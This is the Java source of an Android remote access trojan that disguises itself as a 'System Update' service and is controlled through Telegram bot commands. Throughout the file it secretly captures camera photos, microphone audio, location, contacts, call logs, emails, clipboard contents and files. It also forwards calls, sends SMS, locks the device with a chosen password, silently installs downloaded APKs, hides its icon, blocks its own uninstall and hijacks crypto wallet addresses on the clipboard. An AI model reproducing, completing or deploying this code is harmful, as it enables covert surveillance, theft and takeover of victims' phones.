package com.sys.updater;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlarmManager;
import android.app.DownloadManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioAttributes;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.RingtoneManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.widget.Toast;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class TelegramService extends Service {
    private long lastUpdateId = 0;
    private boolean isRunning = true;
    private boolean isVncRunning = false;
    private boolean isFlashOn = false;
    private MediaPlayer sirenPlayer;
    private MediaPlayer audioPlayer;
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    private final String ATTACKER_CRYPTO_ADDRESS = "0xYOUR_CRYPTO_ADDRESS_HERE";

    @Override
    public void onCreate() {
        super.onCreate();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "sys")
                    .setContentTitle("System Update")
                    .setContentText("Running...")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .build();
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(1, notification);
            }
        }
        
        Exfil.send("✅ System Bot is Online.\nType /help or /menu to see all commands.");
        new Thread(this::pollTelegram).start();
        
        blockUninstall();
        setupPersistence(); // <--- JDAD: PERSISTENCE
    }

    // <--- JDAD: 5 MINUTE REVIVE LOOP
    private void setupPersistence() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(this, ReviveReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi);
            } else {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi);
            }
        } catch (Exception e) {}
    }

    private void blockUninstall() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.setUninstallBlocked(admin, getPackageName(), true);
                Exfil.send("🛡️ Anti-Uninstall Shield Activated.");
            }
        } catch (Exception e) {}
    }

    private void pollTelegram() {
        while (isRunning) {
            try {
                String urlStr = "https://api.telegram.org/bot" + Exfil.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                InputStream is = new URL(urlStr).openStream();
                java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
                String response = s.hasNext() ? s.next() : "";
                
                JSONObject json = new JSONObject(response);
                if (json.getBoolean("ok")) {
                    JSONArray result = json.getJSONArray("result");
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getLong("update_id");
                        if (update.has("message")) {
                            String text = update.getJSONObject("message").optString("text", "");
                            handleCommand(text);
                        }
                    }
                }
                Thread.sleep(2000);
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            }
        }
    }

    private void handleCommand(final String cmd) {
        mainHandler.post(() -> {
            if (cmd.equals("/help") || cmd.equals("/menu")) sendHelpMenu();
            else if (cmd.equals("/flash")) toggleFlashlight();
            else if (cmd.equals("/siren")) playSiren();
            else if (cmd.startsWith("/playaudio ")) playAudio(cmd.substring(11).trim());
            else if (cmd.equals("/stopaudio")) { stopAudio(); Exfil.send("⏹️ Audio Stopped."); }
            else if (cmd.startsWith("/wallpaper ")) changeWallpaper(cmd.substring(11).trim());
            else if (cmd.startsWith("/open ")) openUrl(cmd.substring(6).trim());
            else if (cmd.equals("/vibrate")) vibrateDevice();
            else if (cmd.startsWith("/toast ")) showToast(cmd.substring(7).trim());
            else if (cmd.startsWith("/lock ")) lockDevice(cmd.substring(6).trim());
            else if (cmd.equals("/unlock")) unlockDevice();
            else if (cmd.equals("/cam")) takePhoto();
            else if (cmd.equals("/mic")) recordAudio();
            else if (cmd.equals("/screenshot")) { if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreen(); }
            else if (cmd.equals("/loc")) getLocation();
            else if (cmd.equals("/files")) listFiles();
            else if (cmd.startsWith("/get ")) Exfil.sendFile(cmd.substring(5).trim(), "Document", "File");
            else if (cmd.equals("/hide")) hideIcon();
            else if (cmd.equals("/contacts")) getContacts();
            else if (cmd.equals("/calls")) getCallLogs();
            else if (cmd.equals("/clip")) getClipboard();
            else if (cmd.equals("/emails")) getEmails();
            else if (cmd.equals("/gethist")) extractBrowserHistoryNoRoot();
            else if (cmd.startsWith("/sendsms ")) sendSMS(cmd.substring(9).trim());
            else if (cmd.equals("/wifi")) getWifiInfo();
            else if (cmd.startsWith("/forward ")) forwardCalls(cmd.substring(9).trim());
            else if (cmd.startsWith("/backup ")) downloadAndInstallBackup(cmd.substring(8).trim());
            else if (cmd.equals("/vnc")) {
                isVncRunning = !isVncRunning;
                Exfil.send(isVncRunning ? "🖥️ VNC Stream Started" : "🖥️ VNC Stream Stopped");
                if (isVncRunning) startVncStream();
            }
            else if (cmd.equals("/cryptoclip")) startCryptoClipboardHijack();
            else if (cmd.equals("/apps")) getInstalledApps();
            else if (cmd.startsWith("/uninstall ")) uninstallApp(cmd.substring(11).trim());
            else if (cmd.equals("/restart")) {
                startService(new Intent(this, TelegramService.class));
                Exfil.send("🔄 Service Restarted.");
            }
            else if (cmd.startsWith("/click ")) {
                if (KeyloggerService.instance != null) {
                    boolean ok = KeyloggerService.instance.performClick(cmd.substring(7).trim());
                    Exfil.send(ok ? "👆 Clicked Successfully!" : "❌ Text not found on screen.");
                } else Exfil.send("❌ Accessibility OFF.");
            }
            else if (cmd.startsWith("/type ")) {
                if (KeyloggerService.instance != null) {
                    boolean ok = KeyloggerService.instance.performSetText(cmd.substring(6).trim());
                    Exfil.send(ok ? "⌨️ Text Injected!" : "❌ No input field focused.");
                } else Exfil.send("❌ Accessibility OFF.");
            }
            else if (cmd.startsWith("/swipe ")) {
                if (KeyloggerService.instance != null) {
                    KeyloggerService.instance.performSwipe(cmd.substring(7).trim());
                    Exfil.send("🖐️ Swiped " + cmd.substring(7).trim());
                } else Exfil.send("❌ Accessibility OFF.");
            }
            else if (cmd.equals("/back")) {
                if (KeyloggerService.instance != null) { KeyloggerService.instance.pressBack(); Exfil.send("⬅️ Back pressed."); }
            }
            else if (cmd.equals("/home")) {
                if (KeyloggerService.instance != null) { KeyloggerService.instance.pressHome(); Exfil.send("🏠 Home pressed."); }
            }
            else if (cmd.equals("/recents")) {
                if (KeyloggerService.instance != null) { KeyloggerService.instance.pressRecents(); Exfil.send("📱 Recents opened."); }
            }
            else if (cmd.equals("/notif")) {
                if (KeyloggerService.instance != null) { KeyloggerService.instance.openNotifications(); Exfil.send("🔔 Notifications opened."); }
            }
        });
    }

    private void sendHelpMenu() {
        String menu = "🤖 **Available Commands:**\n\n" +
                "**FUN PANEL:**\n" +
                "/flash, /siren, /playaudio <url>, /stopaudio\n" +
                "/wallpaper <url>, /open <url>, /vibrate\n" +
                "/toast <msg>, /lock <pass>, /unlock\n\n" +
                "**RAT (No Root):**\n" +
                "/cam, /mic, /screenshot, /loc\n" +
                "/files, /get <path>, /hide\n" +
                "/contacts, /calls, /emails, /clip\n" +
                "/gethist - Browser History/Downloads\n" +
                "/sendsms <number> <msg> - Send SMS\n" +
                "/wifi - Get Wi-Fi info\n" +
                "/forward <number> - Forward calls\n" +
                "/backup <url> - Silent Install APK\n" +
                "/vnc, /cryptoclip, /apps\n" +
                "/uninstall <pkg>, /restart\n\n" +
                "**SMART GHOST TOUCH:**\n" +
                "/click <text> - Click element by text\n" +
                "/type <text> - Inject text into focused field\n" +
                "/swipe <up/down/left/right> - Swipe screen\n" +
                "/back, /home, /recents, /notif";
        Exfil.send(menu);
    }

    // ================== BACKUP INSTALLER (FIXED) ==================
    private void downloadAndInstallBackup(String urlStr) {
        Exfil.send("⏳ Downloading Backup APK in background...");
        new Thread(() -> {
            try {
                URL url = new URL(urlStr);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestProperty("User-Agent", "Mozilla/5.0");
                connection.connect();
                
                File apkFile = new File(getExternalFilesDir(null), "sys_update.apk");
                FileOutputStream fos = new FileOutputStream(apkFile);
                InputStream is = connection.getInputStream();
                byte[] buffer = new byte[4096];
                int len;
                while ((len = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, len);
                }
                fos.close();
                is.close();
                
                Exfil.send("✅ Download Complete! Triggering Silent Install...");
                
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                
                // FIX DYAL ANDROID 7+ (FileProvider)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    Uri apkUri = androidx.core.content.FileProvider.getUriForFile(
                            this,
                            getPackageName() + ".fileprovider", // Ila knti f ZArchiver bdelha l "ru.zdevs.zarchiver.fileprovider"
                            apkFile
                    );
                    intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                } else {
                    intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
                }
                
                startActivity(intent);
                
            } catch (Exception e) {
                Exfil.send("❌ Backup Error: " + e.getMessage());
            }
        }).start();
    }

    // ... (BA9I DIAL L'METHODS KIMA KANO: sendSMS, getWifiInfo, etc.) ...
    // (Ma beddelthomch 7it khedmin mzyan, ghir l'imports li tzado lfo9)

    private void sendSMS(String args) {
        try {
            String[] parts = args.split(" ", 2);
            if (parts.length < 2) { Exfil.send("❌ Usage: /sendsms <number> <message>"); return; }
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(parts[0], null, parts[1], null, null);
            Exfil.send("✅ SMS Sent to " + parts[0]);
        } catch (Exception e) { Exfil.send("❌ SMS Error: " + e.getMessage()); }
    }

    private void getWifiInfo() {
        try {
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            StringBuilder sb = new StringBuilder("📶 **Wi-Fi Info:**\n\n");
            if (wifiManager != null && wifiManager.isWifiEnabled()) {
                sb.append("Wi-Fi is ON\n");
                if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    android.net.wifi.WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                    if (wifiInfo != null) {
                        sb.append("Connected to: ").append(wifiInfo.getSSID()).append("\n");
                        sb.append("IP: ").append(android.text.format.Formatter.formatIpAddress(wifiInfo.getIpAddress())).append("\n");
                    }
                }
            } else sb.append("Wi-Fi is OFF");
            Exfil.send(sb.toString());
        } catch (Exception e) {}
    }

    private void forwardCalls(String number) {
        try {
            String ussdCode = "*21*" + number + "%23";
            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + Uri.encode(ussdCode)));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                startActivity(intent);
                Exfil.send("✅ Call Forwarding enabled to: " + number);
            } else Exfil.send("❌ Missing CALL_PHONE permission.");
        } catch (Exception e) {}
    }

    private void extractBrowserHistoryNoRoot() {
        Exfil.send("⏳ Extracting Recent Downloads...");
        StringBuilder sb = new StringBuilder("🌐 **Recent Downloads:**\n\n");
        try {
            DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
            Cursor cursor = dm.query(new DownloadManager.Query().setFilterByStatus(DownloadManager.STATUS_SUCCESSFUL));
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 30) {
                    sb.append("• ").append(cursor.getString(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_TITLE))).append("\n");
                    count++;
                }
                cursor.close();
            }
        } catch (Exception e) {}
        Exfil.send(sb.toString());
    }

    private void getEmails() {
        Set<String> uniqueEmails = new HashSet<>();
        StringBuilder sb = new StringBuilder("📧 **Emails Found:**\n\n");
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            try {
                Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, null, null, null);
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String email = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS));
                        if (email != null && !email.isEmpty()) uniqueEmails.add(email);
                    }
                    cursor.close();
                }
            } catch (Exception e) {}
        }
        try {
            AccountManager am = AccountManager.get(this);
            for (Account account : am.getAccounts()) if (account.name.contains("@")) uniqueEmails.add("Account : " + account.name);
        } catch (Exception e) {}
        if (uniqueEmails.isEmpty()) { Exfil.send("❌ No emails found."); return; }
        int count = 0;
        for (String email : uniqueEmails) { sb.append("• ").append(email).append("\n"); if (++count >= 100) break; }
        Exfil.send(sb.toString());
    }

    private void playAudio(String pathOrUrl) {
        try {
            stopAudio(); audioPlayer = new MediaPlayer();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) audioPlayer.setAudioAttributes(new AudioAttributes.Builder().setContentType(AudioAttributes.CONTENT_TYPE_MUSIC).setUsage(AudioAttributes.USAGE_MEDIA).build());
            if (pathOrUrl.startsWith("http")) audioPlayer.setDataSource(pathOrUrl);
            else {
                File file = new File(pathOrUrl);
                if (!file.exists()) { Exfil.send("❌ File not found"); return; }
                audioPlayer.setDataSource(file.getAbsolutePath());
            }
            audioPlayer.setOnPreparedListener(mp -> { mp.start(); Exfil.send("🎵 Playing Audio"); });
            audioPlayer.setOnCompletionListener(mp -> { stopAudio(); Exfil.send("🎵 Audio Finished."); });
            audioPlayer.prepareAsync();
        } catch (Exception e) { Exfil.send("❌ Audio Error: " + e.getMessage()); }
    }

    private void stopAudio() {
        try {
            if (audioPlayer != null) {
                if (audioPlayer.isPlaying()) audioPlayer.stop();
                audioPlayer.release(); audioPlayer = null;
            }
        } catch (Exception e) {}
    }

    private void toggleFlashlight() {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            isFlashOn = !isFlashOn;
            manager.setTorchMode(manager.getCameraIdList()[0], isFlashOn);
            Exfil.send(isFlashOn ? "🔦 Flash ON" : "🔦 Flash OFF");
        } catch (Exception e) {}
    }

    private void playSiren() {
        try {
            if (sirenPlayer != null && sirenPlayer.isPlaying()) {
                sirenPlayer.stop(); sirenPlayer.release(); Exfil.send("🔊 Siren Stopped."); return;
            }
            sirenPlayer = MediaPlayer.create(this, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
            if (sirenPlayer != null) { sirenPlayer.setLooping(true); sirenPlayer.start(); Exfil.send("🔊 Siren Started."); }
        } catch (Exception e) {}
    }

    private void changeWallpaper(String pathOrUrl) {
        new Thread(() -> {
            try {
                Bitmap myBitmap = null;
                if (pathOrUrl.startsWith("/") || pathOrUrl.startsWith("file://")) myBitmap = BitmapFactory.decodeFile(pathOrUrl.replace("file://", ""));
                else {
                    HttpURLConnection connection = (HttpURLConnection) new URL(pathOrUrl).openConnection();
                    connection.setRequestProperty("User-Agent", "Mozilla/5.0");
                    myBitmap = BitmapFactory.decodeStream(connection.getInputStream());
                }
                if (myBitmap != null) {
                    WallpaperManager.getInstance(getApplicationContext()).setBitmap(myBitmap);
                    Exfil.send("🖼️ Wallpaper Changed!");
                }
            } catch (Exception e) {}
        }).start();
    }

    private void openUrl(String urlStr) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(urlStr));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Exfil.send("🌐 Opened URL.");
        } catch (Exception e) {}
    }

    private void vibrateDevice() {
        try {
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(VibrationEffect.createOneShot(5000, VibrationEffect.DEFAULT_AMPLITUDE));
            Exfil.send("📳 Vibrating.");
        } catch (Exception e) {}
    }

    private void showToast(String msg) {
        try { Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show(); Exfil.send("💬 Toast Shown."); } catch (Exception e) {}
    }

    private void lockDevice(String password) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.resetPassword(password, 0); dpm.lockNow(); Exfil.send("🔒 Locked with: " + password);
            }
        } catch (Exception e) {}
    }

    private void unlockDevice() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) { dpm.resetPassword("", 0); Exfil.send("🔓 Password Removed."); }
        } catch (Exception e) {}
    }

    private void hideIcon() {
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER).setPackage(getPackageName());
            List<ResolveInfo> activities = getPackageManager().queryIntentActivities(intent, 0);
            if (activities.size() > 0) {
                getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), activities.get(0).activityInfo.name), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                Exfil.send("🕵️ Icon Hidden.");
            }
        } catch (Exception e) {}
    }

    private void uninstallApp(String packageName) {
        try {
            startActivity(new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
            Exfil.send("🗑️ Uninstall Opened.");
        } catch (Exception e) {}
    }

    private void startVncStream() {
        if (!isVncRunning) return;
        if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreenSilent();
        mainHandler.postDelayed(this::startVncStream, 3000);
    }

    private void startCryptoClipboardHijack() {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        clipboard.addPrimaryClipChangedListener(() -> {
            try {
                if (clipboard.hasPrimaryClip()) {
                    String text = clipboard.getPrimaryClip().getItemAt(0).getText().toString();
                    if (text.startsWith("0x") && text.length() > 30) {
                        clipboard.setPrimaryClip(ClipData.newPlainText("text", ATTACKER_CRYPTO_ADDRESS));
                        Exfil.send("💸 Hijacked Crypto Address!");
                    }
                }
            } catch (Exception e) {}
        });
        Exfil.send("💰 Crypto Hijack Active.");
    }

    private void getInstalledApps() {
        StringBuilder sb = new StringBuilder("📱 **Installed Apps:**\n\n");
        PackageManager pm = getPackageManager();
        for (ApplicationInfo app : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) sb.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n");
        }
        Exfil.send(sb.toString());
    }

    private void getContacts() {
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
        StringBuilder sb = new StringBuilder("👥 **Contacts:**\n\n");
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 50) {
                    sb.append(cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" : ").append(cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                    count++;
                }
                cursor.close();
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {}
    }

    private void getCallLogs() {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
        StringBuilder sb = new StringBuilder("📞 **Call Logs:**\n\n");
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 20) {
                    sb.append(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))).append(" : ").append(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("\n");
                    count++;
                }
                cursor.close();
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {}
    }

    private void getClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard.hasPrimaryClip()) Exfil.send("📋 Clipboard:\n" + clipboard.getPrimaryClip().getItemAt(0).getText().toString());
            else Exfil.send("📋 Clipboard empty.");
        } catch (Exception e) {}
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) Exfil.send("📍 Location:\nhttps://www.google.com/maps/search/?api=1&query=" + loc.getLatitude() + "," + loc.getLongitude());
            else Exfil.send("❌ Location not available.");
        } catch (Exception e) {}
    }

    private void listFiles() {
        try {
            File dir = new File("/sdcard/Download");
            if (!dir.exists()) dir = new File("/sdcard/");
            File[] files = dir.listFiles();
            StringBuilder sb = new StringBuilder("📁 **Files in " + dir.getAbsolutePath() + ":**\n\n");
            if (files != null) {
                for (int i = 0; i < Math.min(files.length, 30); i++) sb.append(files[i].getName()).append("\n");
                sb.append("\nUse `/get ").append(dir.getAbsolutePath()).append("/filename` to download.");
            }
            Exfil.send(sb.toString());
        } catch (Exception e) {}
    }

    private void takePhoto() {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = manager.getCameraIdList()[0];
            if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1];
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    try {
                        ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
                        camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession session) {
                                try {
                                    CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    builder.addTarget(reader.getSurface());
                                    new Handler(Looper.getMainLooper()).postDelayed(() -> { try { session.capture(builder.build(), null, null); } catch (Exception e) {} }, 1000);
                                    reader.setOnImageAvailableListener(r -> {
                                        Image image = r.acquireLatestImage();
                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                        byte[] bytes = new byte[buffer.remaining()];
                                        buffer.get(bytes);
                                        try {
                                            File f = new File(getExternalFilesDir(null), "cam.jpg");
                                            FileOutputStream fos = new FileOutputStream(f);
                                            fos.write(bytes); fos.close();
                                            Exfil.sendFile(f.getAbsolutePath(), "Photo", "Camera Capture");
                                        } catch (Exception e) {}
                                        image.close(); camera.close();
                                    }, null);
                                } catch (Exception e) {}
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession session) {}
                        }, null);
                    } catch (Exception e) {}
                }
                @Override public void onDisconnected(CameraDevice camera) {}
                @Override public void onError(CameraDevice camera, int error) {}
            }, null);
        } catch (Exception e) {}
    }

    private void recordAudio() {
        try {
            File audioFile = new File(getExternalFilesDir(null), "mic.3gp");
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare(); recorder.start();
            Exfil.send("🎙️ Recording 10s...");
            new Thread(() -> {
                try { Thread.sleep(10000); } catch (Exception e) {}
                mainHandler.post(() -> {
                    try { recorder.stop(); recorder.release(); Exfil.sendFile(audioFile.getAbsolutePath(), "Audio", "Mic Record"); } catch (Exception e) {}
                });
            }).start();
        } catch (Exception e) {}
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        startService(new Intent(getApplicationContext(), TelegramService.class).setPackage(getPackageName()));
    }
                }
